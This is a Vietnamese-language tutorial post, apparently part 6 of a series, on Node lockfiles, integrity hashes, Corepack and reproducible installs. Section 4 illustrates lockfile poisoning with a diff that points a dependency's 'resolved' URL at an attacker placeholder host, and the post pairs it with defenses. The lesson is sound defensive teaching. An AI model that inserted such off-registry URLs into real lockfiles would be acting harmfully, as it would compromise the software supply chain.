@@ -1,0 +1,177 @@
+---
+title: 'Node Package Managers · Part 6 — Lockfiles, Determinism & Integrity'
+description: 'How resolution actually picks versions, what an SRI integrity hash guarantees, why Corepack pins the package manager per repo, and how lockfile poisoning attacks work.'
+pubDate: 2026-06-21
+tags: [lockfile, integrity, corepack, security, package_managers_12]
+series: package-managers
+seriesOrder: 6
+draft: false
+---
+
+Đây là **Phần 6 của series 12 phần** về package manager Node. Ta đã đi qua cả bốn manager. Phần này phóng to bộ máy làm install **tái lập được** — và những cách bộ máy đó bị lật đổ. Đây là cầu nối từ "chúng hoạt động ra sao" sang "chúng bị tấn công ra sao".
+
+---
+
+## 1. Resolution thực sự hoạt động ra sao
+
+Cho range trong `package.json`, manager phải chọn **một** version mỗi package và thoả mãn ràng buộc của *tất cả* cùng lúc. Đây là bài toán thoả mãn ràng buộc:
+
+```text
+app          needs  react ^19.0.0  ,  lodash ^4.17.0
+ui-kit       needs  react ^19.1.0  ,  lodash ^4.17.21
+some-plugin  needs  lodash ^3.10.0
+
+Resolver picks:
+  react  → 19.1.4   (satisfies ^19.0.0 AND ^19.1.0 → single copy, hoisted)
+  lodash → 4.17.21  (satisfies ^4.17.0 AND ^4.17.21)
+  lodash → 3.10.1   (^3 can't merge with ^4 → SECOND copy, nested)
+{^3 không gộp được với ^4 → bản thứ hai, lồng vào}
+```
+
+Khi range **chồng lấn**, manager gộp thành một version chung. Khi **không thể**, nó cài nhiều bản (doppelganger ở Phần 2). Lockfile rồi ghi *kết quả chính xác* để không ai phải giải lại.
+
+> Cảnh báo về tính xác định: resolution có thể phụ thuộc thuật toán resolver và cả thứ tự cài. Đó *là lý do* lockfile tồn tại — nó đóng băng kết quả để máy thứ hai không suy ra lại một cây (có thể khác).
+
+---
+
+## 2. Hash integrity đảm bảo gì
+
+Mỗi entry lockfile mang trường **integrity** — một hash SRI của tarball package:
+
+```text
+"integrity": "sha512-AbCdEf0123...=="
+                │      └── base64 of the SHA-512 digest of the .tgz bytes
+                └── the hash algorithm
+```
+
+Mỗi lần install, manager tải tarball, hash byte, và **so sánh**:
+
+```text
+download react-19.1.4.tgz → sha512(bytes) == lockfile.integrity ?
+   match    → unpack, use it          {khớp → giải nén, dùng}
+   mismatch → ABORT the install        {lệch → HỦY install}
+```
+
+Đây là đảm bảo bảo mật quan trọng nhất trong cả hệ thống: **nếu chỉ một byte của package khác với lockfile ghi, install fail**. CDN bị giả mạo, tải hỏng, hay tarball bị tráo đều bị bắt ở đây.
+
+Điểm gài: nó chỉ bảo vệ chống thay đổi của một *version đã ghi cụ thể*. Nó **không** ngăn một *version độc hại mới* được publish và kéo vào bởi range `^` — đó là Phần 9.
+
+### Tự tay xác minh một hash
+
+Chuỗi SRI chỉ là `base64(sha512(byte tarball))` — bạn tái tạo được:
+
+```bash
+npm pack lodash@4.17.21               # downloads lodash-4.17.21.tgz
+cat lodash-4.17.21.tgz | openssl dgst -sha512 -binary | openssl base64 -A
+# prepend "sha512-" → compare to the "integrity" in your lockfile. Identical.
+{thêm "sha512-" rồi so với "integrity" trong lockfile — giống hệt}
+```
+
+Hash phủ **tarball**, tức artifact *đã publish* — **không** phải repo GitHub của package. Đây là bài học xz sớm (Phần 9): integrity chứng minh "byte khớp cái đã ghi", không bao giờ "byte là vô hại".
+
+---
+
+## 3. Định dạng lockfile cạnh nhau
+
+Cả bốn giải cùng bài toán; định dạng khác nhau ở độ dài dòng và độ dễ diff:
+
+| Manager | Lockfile | Format | Dễ diff |
+|---|---|---|---|
+| npm | `package-lock.json` | JSON | Dài, diff ồn |
+| Yarn Classic | `yarn.lock` | Văn bản riêng | Tốt |
+| Yarn Berry | `yarn.lock` (+ `.pnp.cjs`) | YAML-ish | Tốt |
+| pnpm | `pnpm-lock.yaml` | YAML | **Tốt nhất** — gọn |
+| Bun | `bun.lock` | Văn bản (từ 1.2) | Tốt (trước là nhị phân) |
+
+Việc Bun đổi từ `bun.lockb` nhị phân sang `bun.lock` văn bản ở 1.2 do đúng mối lo này: lockfile nhị phân **không review được** trong code review, nên bạn không *thấy* được thay đổi độc hại.
+
+### `lockfileVersion` — định dạng vẫn tiến hóa
+
+Số `lockfileVersion` ở đầu `package-lock.json` không phải trang trí — nó đổi cái file biểu diễn được, và trộn version manager trong team âm thầm viết lại nó:
+
+```text
+lockfileVersion 1  → npm v5/v6   (legacy "dependencies" tree)
+lockfileVersion 2  → npm v7      (adds the "packages" map; back-compatible)
+lockfileVersion 3  → npm v9+     ("packages" only; smaller, the current default)
+```
+
+Nếu hai đồng đội dùng npm major khác nhau cùng chạy `npm install`, lockfile có thể nhảy version qua lại, tạo diff khổng lồ vô nghĩa. Cách sửa là công cụ ở mục kế — Corepack — ghim chính version manager.
+
+---
+
+## 4. Đầu độc lockfile — tấn công vào diff review được
+
+Lockfile được install `--frozen`/`ci` tin tưởng mù quáng. Sự tin tưởng đó là bề mặt tấn công. Trong tấn công **đầu độc lockfile**, một PR độc hại sửa *chỉ* lockfile để tráo URL `resolved` hoặc integrity của dependency trỏ tới package độc hại:
+
+```text
+# A diff that looks boring but is an attack:
+  "node_modules/left-pad": {
+-   "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
+-   "integrity": "sha512-LEGIT..."
++   "resolved": "https://evil.example.com/left-pad-1.3.0.tgz",
++   "integrity": "sha512-MALICIOUS..."
+  }
+```
+
+Vì `npm ci` *tin lockfile hơn `package.json`*, nó sẽ vui vẻ tải tarball của kẻ tấn công. Cách phòng:
+
+- **Review diff lockfile** kỹ như code, nhất là thay đổi `resolved`/`integrity`/registry.
+- **Khoá registry** bằng `.npmrc` để URL ngoài registry bị từ chối.
+- Tool như `lockfile-lint` khẳng định mọi URL trỏ tới host tin cậy.
+
+---
+
+## 5. Corepack — ghim chính cái manager
+
+Tính tái lập vỡ nếu đồng đội dùng *version khác nhau của package manager*. Yarn 1 vs Yarn 4, pnpm 8 vs pnpm 10 — chúng resolve và bố trí khác nhau. **Corepack** (đi kèm Node) giải bằng cách ghim manager trong `package.json`:
+
+```json
+{
+  "packageManager": "pnpm@10.4.1+sha256.<hash>"
+}
+```
+
+```bash
+corepack enable           # let Node intercept npm/yarn/pnpm shims
+corepack use pnpm@10      # write the packageManager field + install that version
+```
+
+Giờ ai chạy `pnpm install` trong repo này tự động dùng **đúng** `pnpm@10.4.1` — kể cả trên CI, kể cả pnpm toàn cục của họ là version khác. Hash `+sha256` tuỳ chọn nghĩa Corepack xác minh chính binary manager trước khi chạy.
+
+> Đây là cách sạch nhất để chấm dứt lỗi "chạy với pnpm của tôi" và làm "một lockfile mỗi repo" thực sự cưỡng chế được.
+
+---
+
+## 6. Danh sách kiểm tra tính tái lập
+
+```text
+[ ] Exactly ONE lockfile committed                  {đúng MỘT lockfile}
+[ ] packageManager field set (Corepack)             {có field packageManager}
+[ ] CI uses the FROZEN install, never plain install  {CI dùng frozen}
+      npm ci · pnpm i --frozen-lockfile ·
+      yarn install --immutable · bun install --frozen-lockfile
+[ ] Registry pinned in .npmrc (no off-registry URLs) {ghim registry}
+[ ] Lockfile diffs reviewed like code                {review diff lockfile}
+[ ] Node version pinned (.nvmrc / engines / volta)   {ghim version Node}
+```
+
+Đạt cả sáu thì hai dev — cộng CI — tạo `node_modules` giống hệt từng byte từ cùng commit, mọi lúc.
+
+---
+
+## Giờ bạn đã biết gì
+
+- Resolution gộp range chồng lấn thành một version và lồng phần còn lại.
+- **Hash integrity SRI** fail install nếu byte nào của version đã ghi đổi.
+- **Đầu độc lockfile** vũ khí hoá lòng tin mù của `ci` — review diff và khoá registry.
+- **Corepack** ghim version manager mỗi repo cho tính tái lập thật.
+
+---
+
+## Bài tập
+
+1. Mở một entry lockfile, copy `integrity`, và tự xác minh.
+2. Thêm `"packageManager"` qua `corepack use` và xác nhận shell mới dùng đúng version.
+3. Sửa tay URL `resolved` trong lockfile test và chạy frozen install để xem nó bị bắt ra sao.
+
+Tiếp theo — Phần 7: Lifecycle script & `node-gyp`:
